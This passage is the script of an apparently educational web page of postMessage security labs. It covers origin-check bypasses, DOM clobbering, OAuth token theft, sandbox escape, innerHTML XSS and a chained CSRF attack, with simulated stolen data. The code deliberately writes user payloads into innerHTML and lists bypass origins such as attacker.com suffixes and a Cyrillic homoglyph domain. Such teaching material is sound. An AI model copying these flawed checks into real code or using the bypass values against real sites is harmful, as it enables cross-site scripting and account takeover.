Origin '${origin}' does not contain 'trusted-site.com'
Try: evil-trusted-site.com.attacker.com
                `;
            }
        }
        
        function resetLab2() {
            document.getElementById('lab2-content').innerHTML = 'Protected content area';
            document.getElementById('lab2-output').innerHTML = '';
        }
        
        // Lab 3: Data Exfiltration
        function exploitLab3() {
            const output = document.getElementById('lab3-output');
            
            // Simulate data exfiltration attack
            const stolenData = {
                userData: {
                    username: 'john_doe',
                    email: 'john@example.com',
                    balance: '$5,000',
                    sessionToken: 'sess_abc123xyz789',
                    lastLogin: new Date().toISOString()
                }
            };
            
            interceptedData.push(stolenData);
            
            output.innerHTML = `
üö® SENSITIVE DATA INTERCEPTED!
Timestamp: ${new Date().toLocaleString()}
Data stolen: ${JSON.stringify(stolenData, null, 2)}

üí• Impact: Complete user data compromise!
- Username and email exposed
- Financial information leaked
- Session token stolen (account takeover possible)
            `;
        }
        
        function resetLab3() {
            interceptedData = [];
            document.getElementById('lab3-output').innerHTML = 'No data intercepted yet...';
        }
        
        // Lab 4: OAuth Token Theft
        function simulateOAuth() {
            const token = document.getElementById('lab4-token').value;
            
            // Store token in simulated localStorage
            sessionStorage.setItem('oauth_token', token);
            
            alert('OAuth flow simulated - token stored in session');
        }
        
        function exploitOAuth() {
            const output = document.getElementById('lab4-output');
            const token = sessionStorage.getItem('oauth_token') || 'No token found';
            
            output.innerHTML = `
üéØ OAUTH TOKEN INTERCEPTED!
Stolen Token: ${token}
Method: postMessage interception
Impact: Full account access with stolen OAuth token

‚ö†Ô∏è Real-world consequences:
- Complete account takeover
- Access to user's connected apps
- Potential financial fraud
            `;
        }
        
        function resetLab4() {
            sessionStorage.removeItem('oauth_token');
            document.getElementById('lab4-output').innerHTML = 'No tokens captured...';
        }
        
        // Lab 5: DOM Clobbering
        function setupClobbering() {
            const payload = document.getElementById('lab5-clobber').value;
            const target = document.getElementById('lab5-target');
            const output = document.getElementById('lab5-output');
            
            target.innerHTML = payload;
            
            // Check if clobbering worked
            setTimeout(() => {
                if (window.config && window.config.trustedOrigin) {
                    output.innerHTML = `
‚úÖ DOM CLOBBERING SUCCESSFUL!
Original config.trustedOrigin: 'https://trusted-site.com'
Clobbered config.trustedOrigin: '${window.config.trustedOrigin.value}'
Ready for postMessage exploitation...
                    `;
                } else {
                    output.innerHTML = '‚ùå DOM clobbering failed';
                }
            }, 100);
        }
        
        function exploitLab5() {
            const payload = document.getElementById('lab5-payload').value;
            const output = document.getElementById('lab5-output');
            
            // Simulate postMessage with clobbered origin validation
            if (window.config && window.config.trustedOrigin && window.config.trustedOrigin.value === 'https://attacker.com') {
                document.getElementById('lab5-target').innerHTML += payload;
                output.innerHTML += `

üö® EXPLOITATION COMPLETE!
DOM clobbering bypassed origin validation
XSS payload executed: ${payload}
                `;
            } else {
                output.innerHTML += `
‚ùå Setup DOM clobbering first!
                `;
            }
        }
        
        function resetLab5() {
            document.getElementById('lab5-target').innerHTML = 'Target area for DOM clobbering...';
            document.getElementById('lab5-output').innerHTML = '';
            // Reset global config
            config = { trustedOrigin: 'https://trusted-site.com' };
        }
        
        // Lab 6: Advanced Origin Bypass
        function updateOriginTechnique() {
            const technique = document.getElementById('lab6-technique').value;
            const originInput = document.getElementById('lab6-origin');
            
            const techniques = {
                'subdomain': 'https://evil-app.example.com.attacker.com',
                'tld': 'https://app.example.com.evil.com',
                'unicode': 'https://–∞pp.example.com', // Cyrillic '–∞'
                'null': 'null'
            };
            
            originInput.value = techniques[technique];
        }
        
        function exploitLab6() {
            const origin = document.getElementById('lab6-origin').value;
            const payload = document.getElementById('lab6-payload').value;
            const output = document.getElementById('lab6-output');
            
            const allowedOrigins = [
                'https://app.example.com',
                'https://api.example.com',
                'https://cdn.example.com'
            ];
            
            // Vulnerable validation using endsWith
            const isAllowed = allowedOrigins.some(allowed => origin.endsWith(allowed));
            
            if (isAllowed) {
                output.innerHTML = `
‚úÖ ADVANCED BYPASS SUCCESSFUL!
Tested Origin: ${origin}
Validation Logic: allowedOrigins.some(allowed => origin.endsWith(allowed))
Bypass Technique: ${document.getElementById('lab6-technique').value}
Payload: ${payload}

üéØ This demonstrates how complex validation can still be vulnerable!
                `;
            } else {
                output.innerHTML = `
‚ùå Bypass attempt failed
Try different techniques or check the origin format
                `;
            }
        }
        
        function resetLab6() {
            document.getElementById('lab6-output').innerHTML = '';
            updateOriginTechnique();
        }
        
        // Lab 7: Sandbox Escape
        function attemptSandboxEscape() {
            const payload = document.getElementById('lab7-escape').value;
            const output = document.getElementById('lab7-output');
            
            try {
                // Simulate sending message to sandboxed iframe
                const iframe = document.getElementById('sandboxed-frame');
                iframe.contentWindow.postMessage({
                    type: 'execute',
                    code: payload
                }, '*');
                
                output.innerHTML = `
üöÄ SANDBOX ESCAPE ATTEMPTED!
Payload sent to sandboxed iframe: ${payload}
Method: postMessage to iframe.contentWindow
Result: Check console for execution results

Note: Real sandbox escapes depend on specific browser implementations
and sandbox policies. This is a simulation for educational purposes.
                `;
            } catch (e) {
                output.innerHTML = `‚ùå Sandbox escape blocked: ${e.message}`;
            }
        }
        
        function resetLab7() {
            document.getElementById('lab7-output').innerHTML = '';
        }
        
        // Lab 8: Framework Bypass
        function exploitFramework() {
            const framework = document.getElementById('lab8-framework').value;
            const payload = document.getElementById('lab8-payload').value;
            const target = document.getElementById('lab8-target');
            const output = document.getElementById('lab8-output');
            
            // Simulate framework-specific vulnerability
            target.innerHTML = payload;
            
            output.innerHTML = `
‚ö° FRAMEWORK EXPLOIT EXECUTED!
Target Framework: ${framework}
Attack Vector: postMessage ‚Üí ${framework} innerHTML
Payload: ${payload}

üî• Framework-specific vulnerabilities:
- React: dangerouslySetInnerHTML bypass
- Vue: v-html directive exploitation  
- Angular: innerHTML binding attack

Impact: Full XSS in modern framework context!
            `;
        }
        
        function resetLab8() {
            document.getElementById('lab8-target').innerHTML = 'Framework component will render here...';
            document.getElementById('lab8-output').innerHTML = '';
        }
        
        // Lab 9: Chained Exploitation
        let csrfSetup = false;
        
        function setupCSRF() {
            const token = document.getElementById('csrf-token').value;
            csrfSetup = true;
            
            const output = document.getElementById('lab9-output');
            output.innerHTML = `
üéØ Step 1 Complete: CSRF Setup
- CSRF token obtained: ${token}
- Target endpoint identified: /api/transfer
- Ready for postMessage chain...
            `;
        }
        
        function executeChain() {
            const payload = document.getElementById('chain-payload').value;
            const output = document.getElementById('lab9-output');
            
            if (!csrfSetup) {
                output.innerHTML += `
‚ùå Complete CSRF setup first!
                `;
                return;
            }
            
            output.innerHTML += `

‚ö° Step 2 Complete: Chained Exploitation Executed!
- CSRF protection bypassed via postMessage
- Malicious transaction payload: ${payload}
- Attack flow: CSRF ‚Üí postMessage ‚Üí Privilege Escalation

üèÜ ELITE LEVEL ACHIEVEMENT UNLOCKED!
This demonstrates advanced attack chaining techniques
used in real-world sophisticated attacks.

üí• Total Impact:
- Financial fraud enabled
- User authentication bypassed  
- Multiple security controls defeated
            `;
        }
        
        function resetLab9() {
            csrfSetup = false;
            document.getElementById('lab9-output').innerHTML = 'Ready for chained exploitation...';
        }
        
        // Initialize
        updateOriginTechnique();
        
        // Add message listener for demo purposes
        window.addEventListener('message', function(event) {
            console.log('Demo: Received postMessage', event);
        });
        
        // Console welcome message
        console.log(`
üîí postMessage Security Testing Course Loaded!
üéØ Open DevTools and start exploring the labs
üöÄ All code is available for inspection and learning
        `);
    </script>
</body>
</html>
